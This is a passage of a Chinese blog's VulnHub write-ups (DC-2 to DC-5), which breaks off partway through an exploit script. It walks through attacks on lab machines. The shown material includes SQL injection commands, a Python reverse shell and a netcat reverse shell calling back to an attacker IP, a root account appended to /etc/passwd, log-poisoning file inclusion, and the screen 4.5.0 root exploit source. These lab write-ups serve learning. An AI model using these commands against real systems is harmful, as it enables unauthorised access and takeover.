src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220511144834.png" /></p>
<p>存在一个用户叫做
jerry，刚刚ssh登录的时候就失败了，难道是因为jerry用户不允许密码登录，因此尝试是否能够su成jerry
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">su jerry</span><br><span class="line">然后输入刚刚爆破的密码</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220511145033.png" /></p>
<p>在jerry的家目录发现第四个flag <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">jerry@DC-2:~$ cat /home/jerry/flag4.txt</span><br><span class="line">Good to see that you<span class="string">&#x27;ve made it this far - but you&#x27;</span>re not home yet. </span><br><span class="line"></span><br><span class="line">You still need to get the final flag (the only flag that really counts!!!).  </span><br><span class="line"></span><br><span class="line">No hints here - you<span class="string">&#x27;re on your own now.  :-)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Go on - git outta here!!!!</span></span><br></pre></td></tr></table></figure></p>
<p>大致意思为：“很开心看到你走了这么远，但是还没有结束。你还需要拿到最后一个flag。这里没有提示，接下来你只能靠你自己。冲吧-git
outta here”</p>
<p>这里最后一句很奇怪，一般应该是"get outta
here"，不管它。先进行信息收集。在查看sudo -l的时候发现</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220511145405.png" /></p>
<p>根据：<a href="https://gtfobins.github.io/gtfobins/git/">git |
GTFOBins</a></p>
<p>可以使用下面的命令提权： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. sudo /usr/bin/git branch --help config</span><br><span class="line">2. !/bin/bash # 输入上述命令之后，直接输入这条命令</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220511145539.png" /></p>
<p>成功提权到root，接下来查看最后一个flag <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@DC-2:/home/jerry<span class="comment"># cat /root/final-flag.txt</span></span><br><span class="line"> __    __     _ _       _                    _ </span><br><span class="line">/ / /\ \ \___| | |   __| | ___  _ __   ___  / \</span><br><span class="line">\ \/  \/ / _ \ | |  / _` |/ _ \| <span class="string">&#x27;_ \ / _ \/  /</span></span><br><span class="line"><span class="string"> \  /\  /  __/ | | | (_| | (_) | | | |  __/\_/ </span></span><br><span class="line"><span class="string">  \/  \/ \___|_|_|  \__,_|\___/|_| |_|\___\/   </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Congratulatons!!!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">A special thanks to all those who sent me tweets</span></span><br><span class="line"><span class="string">and provided me with feedback - it&#x27;</span>s all greatly</span><br><span class="line">appreciated.</span><br><span class="line"></span><br><span class="line">If you enjoyed this CTF, send me a tweet via @DCAU7.</span><br></pre></td></tr></table></figure></p>
<h1 id="总结">3. 总结</h1>
<p>涉及到如下知识点：</p>
<ol type="1">
<li>wpscan的使用；</li>
<li>定制字典；</li>
<li>rbash逃逸；</li>
<li>sudo提权</li>
<li>GTFOBins</li>
</ol>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>综合</tag>
        <tag>vulnhub</tag>
        <tag>sudo提权</tag>
        <tag>rbash逃逸</tag>
        <tag>字典定制</tag>
        <tag>GTFOBins</tag>
      </tags>
  </entry>
  <entry>
    <title>DC-3 Writeup</title>
    <url>/2022/05/12/DC-3%20Writeup/</url>
    <content><![CDATA[<p>该靶机比较简单，但在权限提升的时候有一丝繁琐。</p>
<span id="more"></span>
<h1 id="靶机信息">1. 靶机信息</h1>
<p>靶机地址：</p>
<ul>
<li><a href="https://www.vulnhub.com/entry/dc-32,312/">DC: 3.2 ~
VulnHub</a></li>
</ul>
<p>目标：</p>
<ul>
<li>拿到root权限</li>
<li>拿到1个flag</li>
</ul>
<p>难度:</p>
<ul>
<li>低</li>
</ul>
<h1 id="渗透">2. 渗透</h1>
<h2 id="主机发现端口扫描端口服务发现">2.1.
主机发现、端口扫描、端口服务发现</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo arp-scan -l</span><br><span class="line">sudo nmap -p- 10.0.2.37</span><br><span class="line">sudo nmap -p80, -A 10.0.2.37</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220511232726.png" /></p>
<p>从中可以知道，该靶机只开了80端口，并且该端口上的网站的CMS为joomla</p>
<h2 id="外围打点">2.2. 外围打点</h2>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220511232829.png" /></p>
<p>根据左边的提示，该靶机只有一个flag，并且没有任何提示。在主页检查一段时间后，没有发现任何有用的点。接下来进行路径扫描。
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://10.0.2.37/</span><br></pre></td></tr></table></figure></p>
<p>路径扫描除了一个后台登录界面之外，没有任何其他有用的信息。</p>
<p>接着，我们需要知道joonla的版本信息，然后在进行漏洞利用。利用msfconsole可以得到版本信息。
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. search joomla</span><br><span class="line">2. use 13</span><br><span class="line">3. set rhost 10.0.2.37</span><br><span class="line">4. run</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220511233138.png" /></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220511233226.png" /></p>
<p>得知joomla的版本为3.7.0。搜索该版本的漏洞</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220511233315.png" /></p>
<p>存在sql注入，注入点在： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">URL Vulnerable: http://10.0.2.37/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml%27</span><br></pre></td></tr></table></figure></p>
<p>sqlnmap利用方式： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://10.0.2.37/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering]</span><br></pre></td></tr></table></figure></p>
<p>输入如下payload探测以下是否真的存在sql注入： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://10.0.2.37/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml(1,concat(0x7e,database()),0)</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220511233547.png" /></p>
<p>确实存在，接下来使用sqlmap即可，payload分别为： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. sqlmap -u &quot;http://10.0.2.37/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering]</span><br><span class="line">2. sqlmap -u &quot;http://10.0.2.37/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D joomladb -p list[fullordering]</span><br><span class="line">3. sqlmap -u &quot;http://10.0.2.37/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D joomladb --tables -p list[fullordering]</span><br><span class="line">4. sqlmap -u &quot;http://10.0.2.37/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D joomladb -T &quot;#__users&quot; -p list[fullordering]</span><br><span class="line">5. sqlmap -u &quot;http://10.0.2.37/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D joomladb -T &quot;#__users&quot; --columns -p list[fullordering]</span><br><span class="line">6. sqlmap -u &quot;http://10.0.2.37/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D joomladb -T &quot;#__users&quot; -C &quot;id,username,password,email&quot; --dump  -p list[fullordering]</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220511233848.png" /></p>
<p>将密码用john破解，得到 snoopy</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220511222646.png" /></p>
<p>到 /administrator/index.php 后台登录。</p>
<h2 id="get-shell">2.3. get shell</h2>
<p>进入后台后，找到模板</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220511234054.png" /></p>
<p>将error.php的内容替换为kali中
/usr/share/webshells/php/php-reverse-shell.php，只需要修改ip即可。</p>
<p>接着利用dirsearch扫描，找出修改的error.php的路径。 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://10.0.2.37/</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220511234310.png" /></p>
<p>因此，真正的路径为/templates/beez3/error.php</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220511234409.png" /></p>
<h2 id="权限提升">2.4. 权限提升</h2>
<p>进行信息收集后，我确定该靶机存在内核漏洞，内核版本太低了。因此，将linux-exploit-suggester.sh
传到靶机，并执行</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220511234617.png" /></p>
<p>有许多的漏洞，我一个一个执行了下来，直到
CVE-2016-4557。脏牛漏洞会使靶机重启。。。</p>
<p>首先需要将 CVE-2016-4557
的压缩包下载到靶机（使用kali下载再传入，下载需要科学上网）</p>
<p>解压之后，目录内有两个压缩包，crasher.tar和exploit.tar，看名字就知道使用后者。（两者好像是一样的）</p>
<p>将其解压，得到compile.sh和doubleput.c，将后者编译，然后：
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1. ./compile.sh</span><br><span class="line">2. ./doubleput</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220511235014.png" /></p>
<p>接下来就可以读取flag了 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@DC-3:/tmp/39772/ebpf_mapfd_doubleput_exploit<span class="comment"># cat /root/the-flag.txt</span></span><br><span class="line">cat /root/the-flag.txt</span><br><span class="line"> __        __   _ _   ____                   _ _ _ _ </span><br><span class="line"> \ \      / /__| | | |  _ \  ___  _ __   ___| | | | |</span><br><span class="line">  \ \ /\ / / _ \ | | | | | |/ _ \| <span class="string">&#x27;_ \ / _ \ | | | |</span></span><br><span class="line"><span class="string">   \ V  V /  __/ | | | |_| | (_) | | | |  __/_|_|_|_|</span></span><br><span class="line"><span class="string">    \_/\_/ \___|_|_| |____/ \___/|_| |_|\___(_|_|_|_)</span></span><br><span class="line"><span class="string">                                                     </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Congratulations are in order.  :-)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">I hope you&#x27;</span>ve enjoyed this challenge as I enjoyed making it.</span><br><span class="line"></span><br><span class="line">If there are any ways that I can improve these little challenges,</span><br><span class="line">please <span class="built_in">let</span> me know.</span><br><span class="line"></span><br><span class="line">As per usual, comments and complaints can be sent via Twitter to @DCAU7</span><br><span class="line"></span><br><span class="line">Have a great day!!!!</span><br></pre></td></tr></table></figure></p>
<h1 id="总结">3. 总结</h1>
<p>该靶机难度不高，就是在权限提升处比较繁琐。涉及到如下知识点：</p>
<ol type="1">
<li>后台get shell</li>
<li>SQL注入</li>
<li>内核漏洞</li>
</ol>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>综合</tag>
        <tag>vulnhub</tag>
        <tag>SQL注入</tag>
        <tag>内核漏洞</tag>
        <tag>后台利用</tag>
      </tags>
  </entry>
  <entry>
    <title>DC-4 Writeup</title>
    <url>/2022/05/12/DC-4%20Writeup/</url>
    <content><![CDATA[<p>该靶机比较简单。</p>
<span id="more"></span>
<h1 id="靶机信息">1. 靶机信息</h1>
<p>靶机地址：</p>
<ul>
<li><a href="https://www.vulnhub.com/entry/dc-4,313/">DC: 4 ~
VulnHub</a></li>
</ul>
<p>目标：</p>
<ul>
<li>拿到root权限</li>
<li>拿到1个flag</li>
</ul>
<p>难度：</p>
<ul>
<li>低 # 2. 渗透 ## 2.1. 主机发现、端口扫描、端口服务发现
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo arp-scan -l</span><br><span class="line">sudo nmap -p- 10.0.2.38</span><br><span class="line">sudo nmap -p22,80 -A 10.0.2.38</span><br></pre></td></tr></table></figure></li>
</ul>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220512090405.png" /></p>
<h2 id="信息收集">2.2. 信息收集</h2>
<p>直接访问80端口，发现只有一个登录界面，源码和数据包没有有用的信息。路径扫描也没有任何有用的结果。因此，只能从登录界面做打算。</p>
<p>我首先尝试了sql注入，但是失败了。又去搜索是否存在可以利用的漏洞，也失败了。是在没办法那就直接爆破。好在爆破成功了，字典选择的是
burp pro 自带的</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220512111117.png" /></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220512103650.png" /></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220512103703.png" /></p>
<p>从 happy 之后的数据包都是636，只有 happy 的是
660，查看对应数据包，确实是 happy 的时候就登录成功了。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin:happy</span><br></pre></td></tr></table></figure>
<h2 id="get-shell">2.3. get shell</h2>
<p>登录进去看到一个功能点：command，并且选择 List Files 然后
run，结果如下</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220512111331.png" /></p>
<p>好像能够直接执行系统命令，经过多次测试，确实如此。因此直接执行反弹shell的命令
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.2.4&quot;,3333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure></p>
<p>成功登录。</p>
<h2 id="权限提升">2.4. 权限提升</h2>
<p>首先查看 /etc/passwd 发现存在除root之外的3个用户： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">charles</span><br><span class="line">jim</span><br><span class="line">sam</span><br></pre></td></tr></table></figure></p>
<h3 id="jim">2.4.1. jim</h3>
<p>首先查看jim的家目录，有三个文件比较可疑</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220512111556.png" /></p>
<p>查看 test.sh
发现只是一个脚本，循环输出字符。如果这里有suid权限就可以直接提权了，太可惜了。</p>
<p>然后查看 backups，该目录下有一个备份文件
old-passwords.bak，里面存放的许多字符串，猜测可能存在 jim
的密码，因此使用hydra爆破： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hydra -l jim -P old-passwords.txt 10.0.2.38 ssh</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220512105836.png" /></p>
<p>得到jim的密码： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jim:jibril04</span><br></pre></td></tr></table></figure> ### 2.4.2. charles
ssh连接上去（shell更好用），然后查看 mbox <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">From root@dc-4 Sat Apr 06 20:20:04 2019</span><br><span class="line">Return-path: &lt;root@dc-4&gt;</span><br><span class="line">Envelope-to: jim@dc-4</span><br><span class="line">Delivery-date: Sat, 06 Apr 2019 20:20:04 +1000</span><br><span class="line">Received: from root by dc-4 with local (Exim 4.89)</span><br><span class="line">        (envelope-from &lt;root@dc-4&gt;)</span><br><span class="line">        id 1hCiQe-0000gc-EC</span><br><span class="line">        for jim@dc-4; Sat, 06 Apr 2019 20:20:04 +1000</span><br><span class="line">To: jim@dc-4</span><br><span class="line">Subject: Test</span><br><span class="line">MIME-Version: 1.0</span><br><span class="line">Content-Type: text/plain; charset=&quot;UTF-8&quot;</span><br><span class="line">Content-Transfer-Encoding: 8bit</span><br><span class="line">Message-Id: &lt;E1hCiQe-0000gc-EC@dc-4&gt;</span><br><span class="line">From: root &lt;root@dc-4&gt;</span><br><span class="line">Date: Sat, 06 Apr 2019 20:20:04 +1000</span><br><span class="line">Status: RO</span><br><span class="line"></span><br><span class="line">This is a test.</span><br></pre></td></tr></table></figure></p>
<p>这看过去象是一封邮件的内容，而Linux存在一个邮箱的目录
/var/mail，因此查看该目录下的情况。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220512111957.png" /></p>
<p>该目录下有两个文件，其中www-data没有有用的信息，而从jim中得到charles的用户名和密码，直接切换用户即可
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">From charles@dc-4 Sat Apr 06 21:15:46 2019</span><br><span class="line">Return-path: &lt;charles@dc-4&gt;</span><br><span class="line">Envelope-to: jim@dc-4</span><br><span class="line">Delivery-date: Sat, 06 Apr 2019 21:15:46 +1000</span><br><span class="line">Received: from charles by dc-4 with local (Exim 4.89)</span><br><span class="line">        (envelope-from &lt;charles@dc-4&gt;)</span><br><span class="line">        id 1hCjIX-0000kO-Qt</span><br><span class="line">        for jim@dc-4; Sat, 06 Apr 2019 21:15:45 +1000</span><br><span class="line">To: jim@dc-4</span><br><span class="line">Subject: Holidays</span><br><span class="line">MIME-Version: 1.0</span><br><span class="line">Content-Type: text/plain; charset=&quot;UTF-8&quot;</span><br><span class="line">Content-Transfer-Encoding: 8bit</span><br><span class="line">Message-Id: &lt;E1hCjIX-0000kO-Qt@dc-4&gt;</span><br><span class="line">From: Charles &lt;charles@dc-4&gt;</span><br><span class="line">Date: Sat, 06 Apr 2019 21:15:45 +1000</span><br><span class="line">Status: O</span><br><span class="line"></span><br><span class="line">Hi Jim,</span><br><span class="line"></span><br><span class="line">I&#x27;m heading off on holidays at the end of today, so the boss asked me to give you my password just in case anything goes wrong.</span><br><span class="line"></span><br><span class="line">Password is:  ^xHhA&amp;hvim0y</span><br><span class="line"></span><br><span class="line">See ya,</span><br><span class="line">Charles</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220512112146.png" /></p>
<h3 id="root">2.4.3. root</h3>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220512112211.png" /></p>
<p>而Linux中有一个命令 tee，看这个名字好像就是 tee。 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">strings /usr/bin/tee</span><br><span class="line">strings /usr/bin/teehee</span><br></pre></td></tr></table></figure></p>
<p>发现两者内容一致，因此先当作tee进行提权。<strong>tee命令的作用主要是可以将字符以标准输入的方式写入文件</strong>。</p>
<p>现在 teehee
是root权限，也就是我们可以利用该命令向一些只允许root写入的文件写入内容，最直接想到的就是
/etc/passwd <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;m1ku1::0:0:::/bin/bash&quot;</span> | sudo /usr/bin/teehee -a /etc/passwd <span class="comment"># -a 表示在原来内容上追加新的内容</span></span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220512112749.png" /></p>
<p>直接切换到 m1ku</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220512112815.png" /></p>
<p>最后，读取/root/flag.txt内容 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">888       888          888 888      8888888b.                             888 888 888 888 </span><br><span class="line">888   o   888          888 888      888  &quot;Y88b                            888 888 888 888 </span><br><span class="line">888  d8b  888          888 888      888    888                            888 888 888 888 </span><br><span class="line">888 d888b 888  .d88b.  888 888      888    888  .d88b.  88888b.   .d88b.  888 888 888 888 </span><br><span class="line">888d88888b888 d8P  Y8b 888 888      888    888 d88&quot;&quot;88b 888 &quot;88b d8P  Y8b 888 888 888 888 </span><br><span class="line">88888P Y88888 88888888 888 888      888    888 888  888 888  888 88888888 Y8P Y8P Y8P Y8P </span><br><span class="line">8888P   Y8888 Y8b.     888 888      888  .d88P Y88..88P 888  888 Y8b.      &quot;   &quot;   &quot;   &quot;  </span><br><span class="line">888P     Y888  &quot;Y8888  888 888      8888888P&quot;   &quot;Y88P&quot;  888  888  &quot;Y8888  888 888 888 888 </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Congratulations!!!</span><br><span class="line"></span><br><span class="line">Hope you enjoyed DC-4.  Just wanted to send a big thanks out there to all those</span><br><span class="line">who have provided feedback, and who have taken time to complete these little</span><br><span class="line">challenges.</span><br><span class="line"></span><br><span class="line">If you enjoyed this CTF, send me a tweet via @DCAU7.</span><br></pre></td></tr></table></figure></p>
<h1 id="总结">3. 总结</h1>
<p>该靶机难度不大，涉及到如下知识点：</p>
<ol type="1">
<li>密码爆破</li>
<li>命令执行</li>
<li>反弹shell</li>
<li>sudo配置不当提权</li>
<li>/etc/passwd 作用</li>
</ol>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>综合</tag>
        <tag>vulnhub</tag>
        <tag>sudo提权</tag>
        <tag>密码爆破</tag>
      </tags>
  </entry>
  <entry>
    <title>DC-5 Writeup</title>
    <url>/2022/05/13/DC-5%20Writeup/</url>
    <content><![CDATA[<p>该靶机难度适中。</p>
<span id="more"></span>
<h1 id="靶机信息">1. 靶机信息</h1>
<p>靶机地址：</p>
<ul>
<li><a href="https://www.vulnhub.com/entry/dc-5,314/">DC: 5 ~
VulnHub</a></li>
</ul>
<p>目标：</p>
<ul>
<li>拿到root权限</li>
<li>拿到1个flag</li>
</ul>
<p>难度：</p>
<ul>
<li>中</li>
</ul>
<h1 id="渗透">2. 渗透</h1>
<h2 id="主机发现端口扫描端口服务发现">2.1.
主机发现、端口扫描、端口服务发现</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo arp-scan -l</span><br><span class="line">sudo nmap -p- 10.0.2.40</span><br><span class="line">sudo nmap -p80,111,36098 -A 10.0.2.40</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220513100013.png" /></p>
<h2 id="信息收集">2.2. 信息收集</h2>
<p>访问80端口</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220513104020.png" /></p>
<p>把所有的功能页面都测试一遍，发现在contact那有提交点，并且提交完成之后会得到新的文件
thankyou.php</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220513104212.png" /></p>
<p>起初还以为存在SQL注入，后来测试没有，就放过这里了，然后去路径扫描，也没有任何结果。其实当多次刷新页面的时候，下面的
Copyright@2018
会发生变化（靶机地址也提示了，多次刷新才能够发现漏洞）</p>
<p>而这个信息是通过包含footer.php文件显示的，因此猜测这里可能存在文件包含，但是我们还不知道参数，可以通过爆破，不过我先尝试了以下file，结果就过了</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220513104653.png" /></p>
<p>因为没有ssh服务，所以只能通过文件包含来获得shell。</p>
<h2 id="get-shell">2.3. get shell</h2>
<p><strong>思路：利用文件包含一个含有php利用代码的文件</strong>。</p>
<p>靶机上不可能存在这样的一个文件，所以我们需要手动写入。文件包含漏洞是无法写入文件的，因此只能够通过某种功能，使系统自动写文件，也就是日志。其中，通过端口服务发现直到80端口的服务为http，且cms为nginx，通过搜索知道默认日志存储文件路径为：/var/log/nginx/，先访问了/var/log/nginx/access.log，发现没有信息。又访问了
/var/log/nginx/error.log 出现了信息。</p>
<p>通过查看源码，发现好像error.log会记录访问的url的信息</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220513105101.png" /></p>
<p>因此构造如下payload</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220513105149.png" /></p>
<p>然后输入如下url： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://10.0.2.40/thankyou.php?file=/var/log/nginx/error.log&amp;ant=id</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220513105325.png" /></p>
<p>成功写入。（如果直接查看日志，而不加命令，有可能不显示php的代码，因为被执行了所以不显示，如果显示了，说明php代码没被执行！）</p>
<p>输入如下反弹shell的payload：（先确定有没有nc） <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://10.0.2.40/thankyou.php?file=/var/log/nginx/error.log&amp;ant=nc -e /bin/bash 10.0.2.4 3333</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220513105659.png" /></p>
<h2 id="权限提升">2.4. 权限提升</h2>
<p>当查找suid文件的时候，发现了一个可疑的文件 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -<span class="built_in">type</span> f -ls 2&gt;/dev/null</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220513105837.png" /></p>
<p>不知道这文件的作用，就去搜索了一下有没有利用漏洞</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220513105946.png" /></p>
<p>直接把sh文件传到靶机执行，发现报错了，报错信息如下：
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">~ gnu/screenroot ~</span><br><span class="line">[+] First, we create our shell and library...</span><br><span class="line">gcc: error trying to exec &#x27;cc1&#x27;: execvp: No such file or directory</span><br><span class="line">gcc: error trying to exec &#x27;cc1&#x27;: execvp: No such file or directory</span><br><span class="line">[+] Now we create our /etc/ld.so.preload file...</span><br><span class="line">[+] Triggering...</span><br><span class="line">&#x27; from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.</span><br><span class="line">ERROR: ld.so: object &#x27;/tmp/libhax.so&#x27; from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.</span><br><span class="line">No Sockets found in /tmp/screens/S-www-data.</span><br><span class="line"></span><br><span class="line">./41154.sh: line 42: /tmp/rootshell: No such file or directory</span><br></pre></td></tr></table></figure></p>
<p>分析报错信息：gcc需要调用cc1（gcc分两个步骤：预处理和编译。其中预处理为cpp完成，而编译由cc1完成）。而靶机上没有cc1。</p>
<p>查看 sh
文件的内容，可以发现该文件会创建两个c文件，并进行编译，最后才提权。</p>
<p>解决办法也很简单：在kali上将两个c文件编译好，然后传到靶机</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 41154.sh 文件内容：</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> screenroot.sh</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> setuid screen v4.5.0 <span class="built_in">local</span> root exploit</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> abuses ld.so.preload overwriting to get root.</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> HACK THE PLANET</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> ~ infodox (25/1/2017)</span></span><br><span class="line">echo &quot;~ gnu/screenroot ~&quot;</span><br><span class="line">echo &quot;[+] First, we create our shell and library...&quot;</span><br><span class="line">cat &lt;&lt; EOF &gt; /tmp/libhax.c</span><br><span class="line"><span class="meta">#</span><span class="bash">include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="meta">#</span><span class="bash">include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="meta">#</span><span class="bash">include &lt;unistd.h&gt;</span></span><br><span class="line">__attribute__ ((__constructor__))</span><br><span class="line">void dropshell(void)&#123;</span><br><span class="line">    chown(&quot;/tmp/rootshell&quot;, 0, 0);</span><br><span class="line">    chmod(&quot;/tmp/rootshell&quot;, 04755);</span><br><span class="line">    unlink(&quot;/etc/ld.so.preload&quot;);</span><br><span class="line">    printf(&quot;[+] done!\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c</span><br><span class="line">rm -f /tmp/libhax.c</span><br><span class="line">cat &lt;&lt; EOF &gt; /tmp/rootshell.c</span><br><span class="line"><span class="meta">#</span><span class="bash">include &lt;stdio.h&gt;</span></span><br><span class="line">int main(void)&#123;</span><br><span class="line">    setuid(0);</span><br><span class="line">    setgid(0);</span><br><span class="line">    seteuid(0);</span><br><span class="line">    setegid(0);</span><br><span class="line">    execvp(&quot;/bin/sh&quot;, NULL, NULL);</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">gcc -o /tmp/rootshell /tmp/rootshell.c</span><br><span class="line">rm -f /tmp/rootshell.c</span><br><span class="line">echo &quot;[+] Now we create our /etc/ld.so.preload file...&quot;</span><br><span class="line">cd 